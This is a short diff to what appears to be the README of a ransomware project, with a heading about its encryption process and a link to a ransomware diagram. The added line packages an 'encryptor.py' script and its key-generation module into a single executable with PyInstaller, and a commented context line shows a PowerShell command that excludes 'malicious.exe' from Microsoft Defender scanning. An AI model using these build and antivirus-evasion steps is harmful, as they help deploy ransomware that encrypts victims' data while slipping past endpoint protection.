@@ -7,5 +7,6 @@
 ### Encryption procss
 ![Alt text](ransomware/diagram/encryption_process.png)
 
+pyinstaller --onefile --hidden-import=symEncryption --hidden-import=keygen .\encryptor.py 
 
 #Add-MpPreference -ExclusionProcess "malicious.exe" #exclude a process
